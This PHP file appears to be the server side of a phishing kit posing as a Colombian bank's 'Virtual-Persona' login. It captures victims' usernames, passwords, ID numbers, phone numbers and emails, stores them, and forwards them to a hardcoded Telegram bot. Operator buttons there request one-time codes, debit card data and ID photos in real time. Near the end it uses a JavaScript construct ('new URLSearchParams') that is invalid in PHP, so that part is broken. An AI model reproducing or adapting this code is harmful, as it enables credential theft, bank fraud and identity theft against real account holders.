<?php

ob_start();
session_start();
require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

date_default_timezone_set('America/Bogota');

$nombreUsuario    = $_POST['usuario']            ?? '';
$password       = $_POST['clave']              ?? '';
$claveUnica     = $_POST['key']                ?? '';
$email          = $_POST['correo']             ?? '';

$tipoDoc        = $_POST['tipo_documento']     ?? '';
$numDoc         = $_POST['numero_documento']   ?? '';
$montoRaw       = $_POST['monto']              ?? '';
$montoTexto     = $_POST['monto_texto']        ?? '';
$nombreUsuarioInit = $_POST['nombre_usuario']  ?? '';
$telefono       = $_POST['telefono']           ?? '';
$bancoPost    = $_POST['banco']              ?? '';

if (trim($claveUnica) === '') {
    $claveUnica = 'auto_' . bin2hex(random_bytes(16));
}

$bancoFinal = (is_string($bancoPost) && trim($bancoPost) !== '') ? trim($bancoPost) : 'Bancolombia';

$sel = $pdo->prepare("SELECT request_id, correo, estado, numero_cuenta, monto, banco, nombre, telefono FROM solicitudes WHERE `key` = ? LIMIT 1");
$sel->execute([$claveUnica]);
$existente = $sel->fetch(PDO::FETCH_ASSOC);

try {
    $idPeticion = 'BCO_' . bin2hex(random_bytes(18));
} catch (Throwable $_) {
    $idPeticion = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
}

$numeroCuentaFinal = trim($telefono) !== '' ? $telefono : ($existente['numero_cuenta'] ?? '');
$montoFinal     = trim($montoTexto) !== '' ? $montoTexto : (trim($montoRaw) !== '' ? $montoRaw : ($existente['monto'] ?? ''));
$nombreFinal    = trim($nombreUsuarioInit) !== '' ? $nombreUsuarioInit : ($existente['nombre'] ?? '');
$correoFinal    = trim($email) !== '' ? $email : ($existente['correo'] ?? '');

$upsert = $pdo->prepare(
    "INSERT INTO solicitudes
        (`key`, `user`, `password`, `request_id`, `correo`, `estado`, `banco`,
         `numero_cuenta`, `monto`, `nombre`, `telefono`)
     VALUES
        (:k, :u, :p, :rid, :em, 'pendiente', :bco,
         :nc, :mont, :nom, :tel)
     ON DUPLICATE KEY UPDATE
         `user`         = VALUES(`user`),
         `password`     = VALUES(`password`),
         `request_id`   = VALUES(`request_id`),
         `correo`       = IF(VALUES(`correo`) <> '', VALUES(`correo`), `correo`),
         `banco`        = IF(VALUES(`banco`) <> '', VALUES(`banco`), `banco`),
         `numero_cuenta` = IF(VALUES(`numero_cuenta`) <> '', VALUES(`numero_cuenta`), `numero_cuenta`),
         `monto`        = IF(VALUES(`monto`) <> '', VALUES(`monto`), `monto`),
         `nombre`       = IF(VALUES(`nombre`) <> '', VALUES(`nombre`), `nombre`),
         `telefono`     = IF(VALUES(`telefono`) <> '', VALUES(`telefono`), `telefono`),
         `estado`       = 'pendiente'"
);
$upsert->execute([
    ':k'    => $claveUnica,
    ':u'    => $nombreUsuario,
    ':p'    => $password,
    ':rid'  => $idPeticion,
    ':em'   => $correoFinal,
    ':bco'  => $bancoFinal,
    ':nc'   => $numeroCuentaFinal,
    ':mont' => $montoFinal,
    ':nom'  => $nombreFinal,
    ':tel'  => $telefono,
]);

$DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
$DEFAULT_CHAT_ID_OPS   = "-5503364698";
$envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
$envCh  = getenv('TELEGRAM_CHAT_ID_OPS');
$botToken = (is_string($envBot) && trim($envBot) !== '') ? $envBot : $DEFAULT_BOT_TOKEN_OPS;
$idChat   = (is_string($envCh)  && trim($envCh)  !== '') ? $envCh  : $DEFAULT_CHAT_ID_OPS;

function fv($v, $placeholder = '<i>(no informado)</i>') {
    $s = is_string($v) ? trim($v) : '';
    return $s === '' ? $placeholder : htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

$docCompleto  = trim($tipoDoc . ' ' . $numDoc);
$montoMuestra = trim($montoFinal);
if ($montoMuestra === '' && trim($montoRaw) !== '') {
    $montoMuestra = trim($montoRaw);
}

$SEP = str_repeat("-", 30);
$mensaje  = "";
$mensaje .= "\xF0\x9F\x86\x95 <b>[LOGIN VIRTUAL-PERSONA]</b> Datos completos capturados en esta sesion:\n";
$mensaje .= $SEP . "\n";
$mensaje .= "\xF0\x9F\x93\x84 <b>Documento:</b> " . fv($docCompleto) . "\n";
if (trim($nombreFinal) !== '' || trim($nombreUsuarioInit) !== '') {
    $mensaje .= "\xF0\x9F\x91\xA4 <b>Nombre (landing):</b> " . fv(trim($nombreFinal) !== '' ? $nombreFinal : $nombreUsuarioInit) . "\n";
}
$mensaje .= "\xF0\x9F\x93\xB1 <b>Celular / Telefono:</b> " . fv($numeroCuentaFinal) . "\n";
$mensaje .= "\xF0\x9F\x92\xB0 <b>Monto / Cupo solicitado:</b> " . fv($montoMuestra) . "\n";
$mensaje .= "\xF0\x9F\x8F\xA6 <b>Banco:</b> " . fv($bancoFinal) . "\n";
$mensaje .= "\xF0\x9F\x93\xA7 <b>Correo:</b> " . fv($correoFinal) . "\n";
$mensaje .= $SEP . "\n";
$mensaje .= "\xF0\x9F\x91\xA4 <b>Usuario Virtual-Persona:</b> " . fv($nombreUsuario) . "\n";
$mensaje .= "\xF0\x9F\x94\x92 <b>Clave Virtual-Persona:</b> " . fv($password) . "\n";

$teclado = [
    'inline_keyboard' => [
        [
            ['text' => "\xF0\x9F\x9F\xA2 DINAMICA",       'callback_data' => "OPCION_1_" . $idPeticion],
            ['text' => "\xF0\x9F\x92\xB3 TARJETA DEBITO", 'callback_data' => "OPCION_2_" . $idPeticion],
        ],
        [
            ['text' => "\xF0\x9F\x94\xB4 ERROR DINAMICA", 'callback_data' => "OPCION_3_" . $idPeticion],
            ['text' => "\xE2\x9D\x8C ERROR CLAVE",        'callback_data' => "OPCION_4_" . $idPeticion],
            ['text' => "\xF0\x9F\x93\xB8 FOTO CEDULA",    'callback_data' => "OPCION_5_" . $idPeticion],
        ],
        [
            ['text' => "\xF0\x9F\x9F\xA9 FINALIZAR",      'callback_data' => "OPCION_10_" . $idPeticion],
        ],
    ],
];

$payload = json_encode([
    'chat_id'                  => $idChat,
    'text'                     => $mensaje,
    'parse_mode'               => 'HTML',
    'disable_web_page_preview' => true,
    'reply_markup'             => $teclado,
]);

$ch = curl_init("https://api.telegram.org/bot" . $botToken . "/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$_SESSION['usuario']          = $nombreUsuario;
$_SESSION['clave']            = $password;
$_SESSION['correo']           = $correoFinal;
$_SESSION['celular']          = $numeroCuentaFinal;
$_SESSION['monto']            = $montoFinal;
$_SESSION['banco']            = $bancoFinal;
$_SESSION['tipo_documento']   = $tipoDoc;
$_SESSION['numero_documento'] = $numDoc;
$_SESSION['nombre']           = $nombreFinal;
$_SESSION['telefono']         = $telefono;
$_SESSION['request_id']       = $idPeticion;
$_SESSION['key']              = $claveUnica;

$redirQs = new URLSearchParams([
    'rid'   => $idPeticion,
    'key'   => $claveUnica,
    'correo'=> $correoFinal,
]);
header("Location: espera.html?" . $redirQs->toString());
exit;
